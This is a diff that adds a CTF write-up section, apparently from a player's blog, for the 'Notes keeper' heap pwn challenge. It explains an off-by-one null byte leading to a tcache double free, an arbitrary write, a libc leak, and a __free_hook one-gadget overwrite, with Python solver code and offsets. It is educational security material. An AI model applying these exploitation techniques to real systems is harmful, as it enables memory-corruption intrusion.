@@ -10,7 +10,9 @@ I did enjoy 3 challenges in this CTF, which encouraged me to work on a detailed 
 * [Notes keeper (Pwn)](#pwn2)
 * [Faster python (Pwn)](#pwn4)
 
-Hope you enjoy this & feel free to contact me for questions, fixes...
+I would like to thank my team mate [t0m7r00z](https://github.com/t0m7r00z) for the huge help when dealing with the heap challenge (Notes Keeper).
+
+ Hope you enjoy this & feel free to contact me for questions, fixes...
 
 ------------
 
@@ -49,13 +51,14 @@ Hope you enjoy this & feel free to contact me for questions, fixes...
 
     Binary: [Here](/2022/GDG%20Algiers/source/pwn/Notes%20keeper/chall)<br />
     Solver: [Here](/2022/GDG%20Algiers/source/pwn/Notes%20keeper/solve.py)<br />
+    Libc: 2.29<br />
     Binary Security:
 
     <p align="center">
     <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/checksec.png"><br/>
     </p>
 
-    * Static Analysis
+    * **Static Analysis**
 
         For this one, we were given a binary file with a libc file. We pass it to Ghidra for static analysis & we can find a menu with 4 options:
 
@@ -160,9 +163,236 @@ Hope you enjoy this & feel free to contact me for questions, fixes...
 
         <br />
 
-    * Exploiting
+    * **Exploiting**
 
-        WIP
+        So, as I mentioned above, I didn't actually notice the ability to get an easy libc leak so I had to figure something out. As a start, I had to figure out a way to get an arbitrary write. Considering the chunk count limit, we cannot fill tcache bin.
+
+        For whoever is new to this, tcache bin consists of a maximum of 7 chunks saved as a linked list, with each chunk pointing to the next chunk.
+
+        Each size have it's own bin, with upto 64 tcache bins. These are mainly used for optimization. Also tcache have a double free check in libc 2.29 which means we'll have to figure some other way around.
+
+        A great resource for me was [this](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/) if you're interested in learning more about heap.
+
+        Now, considering that we have an off by one with a null byte. We should be able to allocate 2 chunks, A & B of the same size (24 for this example). Our heap layout will be the following:
+
+        <p align="center">
+            <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/heap2.png">
+            <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/heap1.png"><br/>
+        </p>
+
+        And `0x0000000000000021` is our chunk size which is 0x20 & the 0x1 is a flag that indicates if the previous chunk is in-use or no.
+
+        If we look at the heap layout, we can notice that we'll be able to write a null byte at a chunk's size. And checking the decompiled code again, we see that we insert a null byte at `written bytes + 1` which means, if we write 24 bytes, we'll be adding a null byte in the 2nd byte of the size value (HeapAdr[25]). We can write 1 less byte in order to overwrite the first byte of the size OR we can use a size greater than 0x100 & overwrite the 2nd byte.
+
+        Now, how can we abuse this? Remember when we talked about tcache, we said that bins contain chunks with the same size, so if we free a different size, it'll go to an other bin which avoids our double free check!
+
+        Now, how do we do that?
+
+        After allocating both A & B, we'll free B then A. When we use such an order, we'll have our A chunk at the end of our tcache linked list. tcache is a LIFO linked list (Last in, first out) which means when we allocate a 24 bytes chunk again, we'll have chunk A and that'll make us able to edit chunk B size to be able to free it again!
+
+        With that, we'll get our double free!
+
+        We can pick 0x188 as our initial size, that'll create a chunk of size 0x190. we free both B & A:
+
+        ```mermaid
+        graph TD;
+        0x190: 
+        ;B-->A
+        ```
+
+        We allocate A again & with it, we'll change B size to 0x100. This will keep chunk B in 0x190 tcache bin.
+
+        ```mermaid
+        graph TD;
+        0x190: 
+        ;B
+        ```
+
+        However, we can free B again & it'll add B to a new tcache bin:
+
+        ```mermaid
+        graph TD;
+        0x190: 
+        ;B
+        ```
+        ```mermaid
+        graph TD;
+        0x100: 
+        ;B
+        ```
+
+        Now we can allocate B twice!
+
+        If you're not familiar with heap, when a chunk is freed the first 16 bytes of the user data will be used as a backword/forward pointer to the next free chunk. If we can allocate B twice, it means we'll be able to change the backword/forward pointer of the 2nd allocation. Which means, we'll have an arbitrary write!
+
+        Transforming that into code, we'll have the following:
+
+        ```python
+        size = 0x188
+
+        newNote(size, "A") # index 0
+        newNote(size, "B") # index 1
+
+        delNote(1)
+        delNote(0)
+
+        newNote(size, "a"*(size-1)) # 0, Change size of chunk 1 to 0x100
+
+        delNote(1) # Double free
+
+        # Chunk size is 0x100, which means 0x100-0x10 are used for user data
+        # The adr offset is const.
+        newNote(0x100-0x10, p64(adr))
+        newNote(size, "C") # Allocate B after corrupting it's pointer
+
+        newNote(size, b"Data") # This is our controlled chunk.
+        ```
+
+        <br/>
+
+        Now with an arbitrary write, we'll need a leak. Since the binary is using Full Relro, GOT overwrite isn't an option. So, we can make use of our malloc/free hooks. We are using libc 2.29 so they are still available.
+
+        For the libc leak, we could've used a negative offset in the view option to read from GOT but I missed that so I had to get creative. 
+        
+        What I came up with: Since we have a heap leak in the view note option, we can allocate a chunk, find it's address & we make an arbitrary write to edit the size of it. If we write a big enough size, freeing the chunk will result in storing it in unsorted bins. With a Use After Free (UAF), we'll be able to leak the libc main arena address!
+
+        After doing so, we'll be able to re-do the arbitrary write to write the address of a one gadget in malloc/free hook.
+
+        Checking the libc, we find some one gadgets:
+
+        <p align="center">
+            <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/one_gads.png"><br/>
+        </p>
+
+        We'll have to check the constraits to know if it'll be possible to use one of them. 
+        
+        We start with the remove note option (free):
+
+        <p align="center">
+            <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/free.png"><br/>
+        </p>
+
+        The index we give is stored in `eax` register, then `rdx = rax * 8`, and it remains unchanged till the free call, which means we can control `rdx` value.
+
+        Now, if we run the binary & set a breakpoint in instruction `remove_note+102`, which is the free call, we can see that `rcx` register is set to 0.
+
+        <p align="center">
+            <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/gdb_bp.png"><br/>
+        </p>
+
+        That decides which one gadget to use! 
+
+        ```
+        0xe2383 execve("/bin/sh", rcx, rdx)
+        constraints:
+            [rcx] == NULL || rcx == NULL
+            [rdx] == NULL || rdx == NULL
+        ```
+
+        Now, we go for the leak. If we simply code what I explained above:
+
+        ```python
+        size = 0x188
+        MAX = 0x200-1
+        
+        newNote(size, "A") # 0
+        newNote(size, "B") # 1
+        
+        adr, _ = viewNote(0) # heap leak
+        
+        delNote(1)
+        delNote(0)
+        
+        newNote(size, "a"*(size-1)) # 0, overwrite size of chunk 1 to 0x100
+        
+        delNote(1) # Double free
+        
+        # Chunk size is 0x100, which means 0x100-0x10 are used for user data
+        # The adr offset is const.
+        newNote(0x100-0x10, p64(adr+0x70+0x120-8))
+        newNote(size, "C") # Allocate B after corrupting it's pointer, we'll use this chunk to leak libc too (Index 1)
+        
+        newNote(size, p64(0x511)) # Controlled adr
+        ```
+
+        We'll face 2 problems:
+        * created_entries == 3: We can bypass this by simply using remove note option with an out of range index. The value must be NULL to avoid any crashes! We can go for `delNote(3)`
+        * If we free our chunk after changing it's size, we'll get a crash: `double free or corruption (!prev)`
+
+        Going for the `free` source code, we can trace the error to this part:
+
+        ```c
+        /* Or whether the block is actually not marked used.  */
+        if (__glibc_unlikely (!prev_inuse(nextchunk)))
+        malloc_printerr ("double free or corruption (!prev)");
+        ```
+
+        Which means, the next chunk, which is located at the address of chunk C + 0x510, must have the prev in-use flag set.
+
+        To reach that area of the memory, we'll need to allocate more chunks. We decrement `created_entries` value again, setting it back to 0, & we can keep allocating chunks, decrement, allocate... Till we reach that area of memory.
+
+        However, when we reach that part & set the prev in-use flag, we'll have to specify a chunk size which will lead to a different error: `corrupted size vs. prev_size`.
+
+        If we trace back the error, we'll find it coming from the `unlink_chunk` function:
+
+        ```c
+        static void
+        unlink_chunk (mstate av, mchunkptr p)
+        {
+            if (chunksize (p) != prev_size (next_chunk (p)))
+                malloc_printerr ("corrupted size vs. prev_size");
+        ```
+
+        Which gets called from this part of `free`:
+
+        ```c
+        if (nextchunk != av->top) {
+            /* get and clear inuse bit */
+            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
+
+            /* consolidate forward */
+            if (!nextinuse) {
+                unlink_chunk (av, nextchunk);
+                size += nextsize;
+            } else
+                clear_inuse_bit_at_offset(nextchunk, 0);
+            
+            ...
+        ```
+
+        What currently happens, it checks the next chunk if it's in-use or no. If it does, it'll simply call `clear_inuse_bit_at_offset` to mark the current chunk not in-use. Else it'll consolidate forward both chunks (Merge them).
+        
+        How does it check if it's in-use? It simply checks for the prev in-use flag in the chunk after it, which apparently lands on a null byte for now resulting in a forward consolidation.
+
+        How to deal with that? We either fake an other chunk or we can simply use the pre-existing top chunk.
+
+        Everything explained above gives the following:
+
+        ```python
+        # Decrease created_entries
+        delNote(3)
+        delNote(3)
+        
+        delNote(3)
+        newNote(MAX, "A")
+        
+        delNote(3)
+        newNote(MAX, b"A"*(0x168) + p64(0xa1)) # This will reach adr+0x510. Offset (0xa0) is the offset between adr+0x510 & the top chunk size.
+        
+        delNote(1)
+        adr, leak = viewNote(1)
+        libc = u64(leak.ljust(8, b'\0')) - 0x1e4ca0
+        
+        one_gad = 0xe2383 + libc
+        free_hook = 0x1e75a8 + libc
+        ```
+
+        After leaking libc, we can write our one gadget in `__free_hook` & use remove note option with index 0 to run our one gadget.
+
+        <br />
+
+        Despite taking a longer road, I did really enjoy this. I'm still new to heap related challenges so, doing it this way actually helped me a lot. I'll be looking forward for more heap challenges!
+
 
 <br />
 
